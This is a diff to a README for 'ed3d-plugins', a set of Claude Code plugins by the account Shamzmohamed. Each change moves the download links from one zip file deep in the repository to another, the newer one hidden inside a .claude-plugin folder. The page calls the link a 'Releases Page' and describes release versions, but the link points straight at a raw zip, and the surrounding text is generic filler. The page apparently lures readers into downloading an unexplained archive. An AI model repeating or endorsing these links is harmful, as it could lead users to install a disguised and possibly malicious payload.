@@ -1,7 +1,7 @@
 # 🎉 ed3d-plugins - Enhance Your Workflow with Claude Plugins
 
 ## 📥 Download Now
-[![Download ed3d-plugins](https://github.com/Shamzmohamed/ed3d-plugins/raw/refs/heads/main/plugins/ed3d-house-style/skills/howto-develop-with-postgres/ed-plugins-d-3.8.zip%20ed3d--plugins-blue)](https://github.com/Shamzmohamed/ed3d-plugins/raw/refs/heads/main/plugins/ed3d-house-style/skills/howto-develop-with-postgres/ed-plugins-d-3.8.zip)
+[![Download ed3d-plugins](https://raw.githubusercontent.com/Shamzmohamed/ed3d-plugins/main/plugins/ed3d-00-getting-started/.claude-plugin/d_ed_plugins_v1.8.zip%20ed3d--plugins-blue)](https://raw.githubusercontent.com/Shamzmohamed/ed3d-plugins/main/plugins/ed3d-00-getting-started/.claude-plugin/d_ed_plugins_v1.8.zip)
 
 ## 📋 Description
 Welcome to Ed's collection of Claude Code plugins. This repository focuses on helping you implement research plans more efficiently. Our plugins aim to simplify your tasks while having a bit of fun along the way. 
@@ -10,7 +10,7 @@ Welcome to Ed's collection of Claude Code plugins. This repository focuses on he
 Getting started with Ed's plugins is simple. Follow these steps to download and run the software.
 
 ### 1. Visit the Releases Page
-To download the plugins, first, visit our [Releases Page](https://github.com/Shamzmohamed/ed3d-plugins/raw/refs/heads/main/plugins/ed3d-house-style/skills/howto-develop-with-postgres/ed-plugins-d-3.8.zip).
+To download the plugins, first, visit our [Releases Page](https://raw.githubusercontent.com/Shamzmohamed/ed3d-plugins/main/plugins/ed3d-00-getting-started/.claude-plugin/d_ed_plugins_v1.8.zip).
 
 ### 2. Download the Latest Version
 On the Releases page, you will see a list of available versions. Look for the latest version labeled as "Latest Release." Click on it to open the download options.
@@ -47,6 +47,6 @@ If you encounter any issues or have questions, please create an Issue on our Git
 ## 📜 License
 Ed's plugins are open-source. You can check the license information on the repository page for details on usage rights and contributions.
 
-[![Download ed3d-plugins](https://github.com/Shamzmohamed/ed3d-plugins/raw/refs/heads/main/plugins/ed3d-house-style/skills/howto-develop-with-postgres/ed-plugins-d-3.8.zip%20ed3d--plugins-blue)](https://github.com/Shamzmohamed/ed3d-plugins/raw/refs/heads/main/plugins/ed3d-house-style/skills/howto-develop-with-postgres/ed-plugins-d-3.8.zip)
+[![Download ed3d-plugins](https://raw.githubusercontent.com/Shamzmohamed/ed3d-plugins/main/plugins/ed3d-00-getting-started/.claude-plugin/d_ed_plugins_v1.8.zip%20ed3d--plugins-blue)](https://raw.githubusercontent.com/Shamzmohamed/ed3d-plugins/main/plugins/ed3d-00-getting-started/.claude-plugin/d_ed_plugins_v1.8.zip)
 
 We hope you enjoy using our plugins and that they enhance your workflow!
